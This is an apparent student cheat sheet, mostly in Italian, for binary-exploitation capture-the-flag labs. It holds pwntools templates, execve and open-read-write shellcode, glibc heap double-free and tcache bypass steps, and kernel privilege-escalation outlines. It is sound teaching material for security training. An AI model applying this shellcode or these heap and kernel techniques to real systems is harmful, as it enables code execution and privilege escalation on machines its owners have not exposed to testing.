# CHEATSHEET

## script base
script base:

from pwn import * 

CHALL_PATH = "./challenge" 
CHALL = ELF(CHALL_PATH) 
COMMANDS = """ 
c 
""" 
context.arch = "amd64"

if args.GDB: 
    c = gdb.debug(CHALL_PATH,COMMANDS) 
elif args.REMOTE: 
    c = remote("challenge.training.offensivedefensive.it", 8080, ssl=True) 
else: 
    c = process(CHALL_PATH)

## Patch eseguibile con corretto libc e ld
1. cp chall chall_patched
2. patchelf --set-interpreter ./ld-X.XX.so chall_patched 
3. ldd chall_patched 
4. patchelf --print-needed chall_patched 
5. patchelf --replace-needed NEEDED_LIBRARY ./REPLACING_LIBRARY chall_patched 
6. ldd chall_patched 
see if something has changed the position, if it's, means that the offsets are wrong (This usually happens when we replace the library with other with a longest name/path --> solution, try to abbreviare the name o the path if it happens)
7. readelf -s chall | grep main
8. readelf -s chall_patched | grep main
 

## UTILITY FUNCTIONS
### lavorare con gli indirizzi
- u64/u32(byte): convertono i byte in interi
- p64/p32(int): convertono interi in byte
- int.from_bytes(bytes, "little")
- hex.to_bytes(8, "little")
- stringa_di_byte.ljust(8,b"\x00"): allunga l'indirizzo a 8/16/... byte aggiungendo \x00 alla fine
- stringa_di_byte.zfill(8): allunga l'indirizzo a 8/16/... byte aggiungendo \x00 all'inizio
- int(address,16): convertire stringa in esadecimale ("0xdeadbeef") in int
- stringa_di_byte.decode('utf-8') --> converte byte in stringa (ex: c.recvuntil(b"ptr_protection").decode('utf-8'))
- str(intero/hex).encode('utf-8') --> converte interi o hex (ex: 1111, 0x1111) in byte

### usare ELF
1. CHALL = ELF(CHALL_PATH)
2. CHALL.address = leak - base address
3. CHALL.symbols["main"] / CHALL.symbols["ps1"] / CHALL.address + offset/... 
oppure
1. LIBC_PATH = "./downloads/libc-2.39.so"
2. LIBC = ELF(LIBC_PATH)
3. bin_sh = next(LIBC.search(b'/bin/sh\0')) / ...

### ricerca nell'output
- cercare un indirizzo hex nell'output 
match = re.search(r'0x[0-9a-fA-F]+', text) --> text è una stringa (NON di byte = ottenuta con decode('utf-8')
main_address = match.group()
- prendere una sola riga:
c.recvuntil(b"> ").splitlines()[1]
- togliere spazi
c.recvline().strip()

### trovare num bytes per overflow dell'indirizzo di ritorno
1. cyclic_payload = cyclic(0x200) --> produce un payload della lunghezza desiderata con sequenza univoca
2. inserire il payload nel programma e vedere con gdb con cosa viene sovrascritto l'indirizzo di ritorno (ex: 0x12345678)
3. cyclic -l 0x12345678 --> restituisce il numero di byte prima di arrivare a quella sequenza

## SHELLCODING
Vulnerability: area di memoria in cui poter scrivere e che viene chiamata durante l'esecuzione del programma
Exploit:

### aprire shell (BASE)
L'obiettivo è di salvare in:
- rdi: la stringa /bin/sh\0 (0x0068732f6e69622f <-- b"string"[::-1].hex())
- rax: 0x3b (execve)
- rsi: 0
- rdx: 0
- invocare la syscall (con tali parametri invoca execve con argomento /bin/sh\0)

shellcode= """  
 mov rdx,0x0068732f6e69622f    
 push rdx 
 mov rdi,rsp 
 mov rax,0x3b
 xor rsi,rsi 
 xor rdx,rdx 
 syscall 
""" 
payload = asm(shellcode) 
c.send(payload)
shellcode= """  
 mov rdx,0x0068732f6e69622f    
 push rdx 
 mov rdi,rsp 
 xor rsi,rsi 
 xor rdx,rdx 
 mov rax, &system
 call rax 
""" 

Altrimenti usa system:


### shellcode (syscall limitate - OPEN, READ, WRITE)
Le principali syscall (execve,...) sono abolite, dobbiamo leggere la flag in altro modo. Al posto di aprire una shell, proviamo a leggere direttamente la flag.

OPEN FILE: 
- RDI: file path (flag\0)
- RSI: opening mode (O_RDONLY = 0)
- RAX: open syscall value

READ FILE: 
- RDI: fd file (written by open in RAX)
la SUB creates a stack frame in which the READ will store the read char
- RSI: buffer address
- RDX: buffer size
- RAX: read syscall value

WRITE FILE: 
- RDI: fd file
- RSI: buffer address
- RDX: buffer size (value read in RAX = number of char read by the READ)
- RAX: write syscall value

shellcode= """ 
mov rdx, 0x00067616c66 
push rdx 
mov rdi,rsp 
mov rsi,0 
mov rax,02 
syscall 
mov rdi,rax 
sub rsp,60 
mov rsi,rsp 
mov rdx,60 
mov rax,0 
syscall 
mov rdi,1 
mov rsi,rsp 
mov rdx,rax 
mov rax,1 
syscall 
""" 
payload = asm(shellcode) 
c.send(shellcode) 

### shellcode - ridirezione di input ed output da fd a stdin/stdout
Nel caso l'input e l'output fossero legati ad una socket. In tal caso, una volta aperta la shell, non potremmo interagirci. Bisogna primi reindirizzare l'input e l'output dalla socket a stdin/stdout

shellcode= """ 
mov rax, 0x21 #dup2(oldfd, newfd) 
mov rdi, fd #sostituire con valore opportuno 
mov rsi, 1 #stdout 
syscall  

mov rax, 0x21 
mov rdi, fd 
mov rsi, 0 #stdin 
syscall 
""" 

### shellcode - limitazioni nel numero di byte (gimmi3bytes)
Un possibile exploit potrebbe basarsi sull'usare i pochi bytes disponibili per scrivere il codice per invocare un'altra 
read (probabilmente la maggior parte dei registri sarà già correttamente settata) per leggere più byte (se possibile) e 
leggere di più.
Ex: in gimme3bytes, c'è una call al buffer di soli 3 bytes leggibili. Mettendo lì un'altra read, quanto letto andrà a
sovrascivere il codice che si sta eseguendo. Dunque, basterà sovrascrivere con nop quanto già eseguito e mettere le 
istruzioni per aprire la shell subito dopo la read.

Un'altra possibilità può essere quella di usare solo parte dei registri (meno byte di istruzione). 
Ex: al invece di eax, ...

## REVERSE
Due possibili soluzioni:
- MANUALE: se la complessità è bassa, più veloce. Chat può aiutare.
- LIBDEBUG -> vedi:
    - reversing/dir_provola (conteggio del numero di volte che in cui il breakpoint viene colpito)
    - reversing/dir_slowProvola (uguale a provola ma con esecuzione della callback --> in quel caso, hook della funzione)
    - packing/dir_jhon (controllo del valore nel registro al momento del breakpoint)

## MITIGATIONS
Spesso in questo tipo di challenges è già presente una funzione del tipo "win"/"print_the_flag"/... 
L'obiettivo è quindi trovare il modo di invocare tale funzione (tramite rop, sovrascivendo la got,...) --> per far ciò è 
necessario un leak della memoria.
Spesso è presente anche un canarino

### canarino
La soluzione ottimale sarebbe quella di farsi stampare il canarino e sovrascriverlo a run time, così a poter effettuare 
un classico overflow. 
Si trova sempre sotto RBP, termina con 00. 
Se l'input viene convertito usando atoll o simili, in caso di canarino "negativo", quest restituisce 0xfffffffffff. 
L'unica soluzione è ritentare fino a che non si è fortunati.

### scanf (theAdder)
La vulnerabilità della scanf è che in caso di carattere differente dal placeholder, termina immediatamente la lettura, 
restituisce 0 e lascia nel buffer il carattere errato ed i successivi.

### GOT
Spesso basta sostituire gli ultimi 3 byte degli indirizzi nella GOT (se NO o PARTIAL RELRO). Questo però comporta 
dover mangari eseguire più volte il codice sperando che il quarto byte coincida (vedi /mitigation/dir_one_write)

### restart del programma (ptr_protection)
A volte può essere utile sovrascrivere l'indirizzo di ritorno del programma con l'indirizzo di main/start o simili in 
modo da farlo ripartire. Scegliende il punto giusto da cui ripartire magari possiamo ottenere un qualche vantaggio.

## ROP
### trovare gadgets
- gadgets: ropper -f chall_patched --nocolor > gadgets.txt
- one_gadget: one_gadget libc-X.XX.so > one_gadget.txt 
NOTA: attenzione ad i gadget con LEAVE. Usano il frame pointer e potrebbero creare problemi se abbiamo già eseguito 
altro prima

## SYMBOLIC
### Z3 
import z3 

#create symbolic input 
a1 = [z3.BitVec(F"C_{i}",32) for i in range(29)] 

solver = z3.Solver()

for i in range(29): 
    solver.add(a1[i] >= 0x20, a1[i] <= 0x7e)

#ADD CHECK FUNCTIONS 
ex: solver.add(a1[5] == 45, a1[11] == 45, a1[17] == 45, a1[23] == 45) 
Corrisponde ad a1[5]==45 && a1[11]==14 && ... 

ex: v1 = z3.If(a1[28] < a1[9], z3.BitVecVal(1,32), z3.BitVecVal(0,32)) 
Corrisponde a: if a1[28] < a1[9] return 1; else 0 --> valore poi assegnato a v1

#usare array con valori costanti per i check
precomputed_table = [0x0, 0x1,....,0xdeadbeef] 
table_bitvec = z3.Array('table_bitvec', z3.BitVecSort(32), z3.BitVecSort(32)) 
for i in range(len(precomputed_table)): 
    solver.add(table_bitvec[i] == z3.BitVecVal(precomputed_table[i], 32)) 

check = solver.check() 
print(check) --> sat or unsat

#stampare la soluzione trovata (se trovata)
for i in range(29): 
    print(chr(solver.model()[a1[i]].as_long()), end="")


### angr
import angr
import claripy

#Define a no-op function to replace func_to_hook
def noop(state):
    return

#instantiation of a project (avoiding to execute some library functions of the program) 
project = angr.Project("./chall", auto_load_libs=False)

#Hook the func_to_hook function by its symbol name 
project.hook_symbol('func_to_hook', noop)

flag = claripy.BVS("flag", 8*N)  # defining a symbolic bitvector of N bytes

#initializing the program 
initial_state = project.factory.entry_state(args=["./chall", flag])

#defining constraints for each byte of the flag using chop 
for i in range(49): 
    initial_state.solver.add(flag.chop(8)[i] < 127) 
    initial_state.solver.add(flag.chop(8)[i] >= 20)

#Define simulation stage 
simulation = project.factory.simgr(initial_state) 
simulation.explore(find=[0x400000 + 0x01418], avoid=[0x400000 + 0x1429, 0x400000 + 0x013D2]) 
NOTA: angr assume 0x400000 come base address di OGNI eseguibile. Dunque abbiamo 2 alternative:
- usare l'offset ottenuto da ida + 0x400000
- usare l'indirizzo effettivo ma cambiare il base address di angr aggiungendo main_opts={'custom_base_addr': 0xdeadbeef} 
  nel costruttore angr.Project(...)
- usare project.loader.find_symbol("NAME").rebased_addr --> per trovare l'indirizzo corretto in base al rebase di angr

if simulation.found: 
    # Retrieve the first solution found (there might be more) 
    found = simulation.found[0] 
    # print the flag 
    print(found.solver.eval(flag, cast_to=bytes)) 
else:
    print("Solution NOT found!")

Sono poi possibili soluzioni più articolate per l'hook della funzione:
- vedi /symbolic/dir_100/solution_angr.py per l'inserimento di un vettore di valori in memoria (prima soluzione)

Oppure è possibile eseguire solamente la funzione necessaria, facendo però in modo che al momento dell'esecuzione i 
registri siano settati correttamente:
-  vedi /symbolic/dir_100/solution_angr.py (seconda soluzione)

## HEAP
Diversi possibili attacchi a seconda del tipo di bin e della versione del libc. 
Comandi utili su gdb: 
- heap 
- bins 
- x/SSgx 0xdeadbeef

### Fastbin 
Vulnerabilità: il controllo sulla doppia free di un chunck viene effettuato solo per il chunck nella head della lista. 
Exploit: 
- allocare 2 chuck A,B (3 eventualmente per evitare il consolidamento con il top chuck)
- fare la free dei chunck A e B 
- fare la free del chunck A di nuovo
- sovrascrivere in uno dei due chunck il forward pointer con un indirizzo a scelta
- allocare nuovi chunck della SIZE GIUSTA fino ad ottenere il chuck allocato nell'indirizzo considerato

NOTA per la scelta dell'indirizzo: esso deve essere tale che nella seconda parte ad 8 byte ci sia un valore sensato per 
l'allocazione di un chunck 
ex: 
OK: 0xdeadbeef 0x0000007f 
NO: 0xdeadbeef 0x1a23f450 

### Unsortedbin
Usato per la free di chunck con size superiore alla 0xA0. 
Vulnerabilità: quando un chunck viene messo nell'unsortedbin, i primi 16 byte della parte di dati viene sovrascritta con 
un forward ed un backward pointer (Tipicamente il backward pointer è un puntatore alla main_arena = indirizzo del libc) 
Exploit: 
- allocare due chuck di grandezza maggiore i 0xA0 (il secondo solo per evitare il consolidamente con il top chunck)
- fare la free del primo chuck
- leggere il contenuto del chunck

### Tcache base (libc >= 2.26)
Usato per i chunck con size minore di 0x500. Diviso in liste (una per ogni size diversa) che possono contenere AL MASSIMO 7
chunck.
Superato tale numero, gli altri vengono messi nel fastbin/unsortedbin/... 
Vulnerabilità: nessun controllo sulla doppia free (neanche per il chunck nella head) 
Exploit:
- doppio free di uno stesso chunck
- proseguire come per Fastbin

### Tcache V2 (libc >= 2.32)
Ogni volta che viene fatta una free, al posto del backward pointer viene scritto un valore (key). In caso di doppia free e 
riconoscimento della chiave, viene generato un errore run time. 
Inoltre il forward pointer viene salvato NON in "chiaro" --> ottenuto dall'indirizzo del next_chunck (shiftato di 12) in 
XOR con la head della lista: 
(next_chunk_address >> 12) XOR head_of_the_list 
Vulnerabilità: possibilità di sovrascrivere la chiave (anche solo un byte) tra la prima e la seconda free 
Exploit:
- free di un chunck
- sovrascrivere la chiave anche solo un byte (tra l'ottavo ed il sedicesimo byte)
- seconda free dello stesso chunck

NOTA: Per sovrascrivere correttamente il forward pointer abbiamo quindi bisogno di due leak: 
- un leak del libc (o stack o dove voglio scrivere)
- un leak dello heap (per conoscere la head della lista)

### Tcache V3 (libc >= 2.34) -- controllare!!
La key è randomica e non è possibile usare la __malloc_hook e la __free_hook 
Vulnerabilità: la lista della tcache è limitata a 7 elementi e la head con cui viene fatto lo xor del primo elemento nella 
Tcache è 0x0000000 (NULL) 
Exploit: 
- allocare e fare la free di due chunck con size > 0x500 per ottenere un leak del libc (vedi unsortedbin)
- allocare 10 chunck con la stessa size < 0x500
- free dei 9 chunck (7 andranno nella tcache, 2 nel fastbin, 1 per evitare il consolidamento)
- ottenere il leak dello heap dal forward pointer del primo chunck di cui si è fatta la free (nella tcache) 
  --> heap_base = addr << 12
- eventualmente aggiustare heap_base per allinearlo alla page (aggiungendo i byte meno significativi) 
  --> nel caso peggiore, heap_base reale è nella page precedente (sottratte un kbyte al leak_heap_base)
- double free del primo chunck del fastbin
- allocare 7 chunck (la tcache diventa vuota)
- allocare 1 chunck (i chucnk nel fastbin vengono messi nella tcache senza alcun controllo sulla doppia free)
- sovrascrivere il forward pointer di un chunck nella tcache con (heap_base + offset >> 12) XOR LIBC.symbols['environ'] 
  (eventualmente allinearlo a 16 byte)
- allocare N chunck per ottenere un chunck in 'environ' (puntatore all'array delle variabili di ambiente = puntatore allo 
  stack)

### Dove allocare?
- sullo stack (ROP)
- sulla GOT
- __malloc_hook/__free_hook: scrivere indirizzo di one_gadget (dopo malloc()), system (dopo malloc(indirizzo dove 
  c'è /bin/sh\0)), ...


## KERNEL

-> guarda bootlin per la documentazione

### include base
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

### file necessari
- unpack_initramfs.sh
- pack_initramfs.sh
- run.sh
- Makefile

### esecuzione
1. fare l'unpack del filesystem (/kernel/unpack_initramfs.sh)
2. Aggiungere a RUN.SH
make 
./pack_initramfs.sh 
3. python upload_exploit.py -s -e /home/user/exploit ./initramfs/exploit chall.training.offensivedefensive.it 8080 
oppure in ipython: %run script.py ...

### debugging
- per avere diritti di root: sostituire in initramfs/init setsid cttyhack setuidgid 1000 sh con 
  setsid cttyhack setuidgid 0 sh
- per debug remoto: 
    - (pwn) sudo gdb
    - target remote :1234
    - set breakpoint at the ioctl_addr
- per verificare la correttezza dell'exploit: objdump -M intel -D initramfs/exploit | grep -A 20 schellcode

### exploit 
(vedi babyker)
- ioctl
- commit_creds(prepare_kernel_creds(0))
- callusermodeheler: argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL};
- modprob_path
- iretq: vedi k-rop composizione stack 

## PACKING 
### script base
base = 0xdead0000 # indirizzo base del programma (visibile su IDA: (Edit, segment, rebase segment)) 
f = open("./chall", "rb") 
content = f.read() 
address = 0xdeadbeef 
unpacked = unpack(address,content,...) 
with open('file_unpacked', 'wb') as f: 
    new_content = content[:address-base] + unpacked + content[address-base+len(unpacked):] 
    f.write(new_content) 
f.close() 

Funzione di unpacking: 

def unpack(address,contents, ...): 
    unpacked = b'' 
    offset = address - base 
    for i in range(0, size*4, 4): # il numero dipende da quanti byte alla volta sono usati per il packing/unpacking 
        unpacked += unpacking_operation(contents[offset+i:offset+i+4]) 
    return unpacked 


## RACE 
### script base
c_token = remote("chall.training.offensivedefensive.it", 8080, ssl=True) 
token = get_tocken(c_token) 
c_token.close() 
print(token) 

c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True) 
c_1.recvuntil(b"Token: ") 
c_1.sendline(token) 
c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True) 
c_2.recvuntil(b"Token: ") 
c_2.sendline(token) 

### vulnerabilità
Vulnerabilità viste durenate le challenges:
- incremento/decremento di un contatore (senza controlli opportuni) e successivo controllo su tale contatore
- controlli separati dall'operazione relativa (ex: lettura sulla size di un file, allocazione memoria quanto la size)
L'idea è che se sono in grado di vincere la race (attuare una operazione tra il controllo e la sucessiva esecuzione), posso
sfruttare tale vulnerabilità.
